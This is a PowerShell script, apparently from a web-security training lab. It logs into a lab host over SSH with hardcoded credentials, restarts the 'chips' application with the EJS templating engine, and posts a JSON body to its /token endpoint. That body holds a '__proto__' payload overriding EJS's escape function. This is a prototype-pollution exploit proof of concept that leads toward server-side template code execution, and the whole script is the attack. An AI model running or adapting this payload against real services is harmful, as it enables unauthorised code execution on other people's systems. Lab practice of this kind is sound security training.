Import-Module Posh-SSH;
[string]$userName = 'student'
[string]$userPassword = 'studentlab'
[string]$machine = 'chips'
[securestring]$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
[pscredential]$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)

$worker = New-SSHSession -ComputerName $machine -Credential $credObject
$worker
$result = Invoke-SSHCommand -Command 'docker-compose -f /home/student/chips/docker-compose.yml down && export TEMPLATING_ENGINE=ejs && docker-compose -f /home/student/chips/docker-compose.yml up -d' -SSHSession $worker
$result

Write-Output "Allowing application to start up sleeping for 10 seconds ..."
Start-Sleep -Seconds 10

$res = iwr -Uri http://chips/ | sls -Pattern '<!-- Using EJS as Templating Engine -->' | % -process {$_.Matches.Value}
Write-Output "Templating engine: $res"

$json_obj = @{
  "connection"= @{
    "type"="rdp";
    "settings"= @{
      "hostname"="rdesktop";
      "username"="abc";
      "password"="abc";
      "port"="3389";
      "security"="any";
      "ignore-cert"="true";
      "client-name"="";
      "console"="false";
      "initial-program"="";
      "__proto__" = @{
        "escape"="function(val){}";
      }
    };
 }
}
$json = convertto-json $json_obj -depth 4
$res = Invoke-WebRequest -Uri "http://$machine/token" -method Post -body $json -ContentType 'application/json' -SkipHttpErrorCheck
$res_content = ConvertFrom-Json $res.Content
Write-Output "rdp token: $($res_content.token)
"

<# possibly use headless chrome here
$uri = "http://$machine/rdp?token=" + $res_content.token + "&width=1762&height=694"
$res1 = Invoke-WebRequest -Uri $uri -SkipHttpErrorCheck -Proxy http://192.168.177.1:8080/
$res1
#>
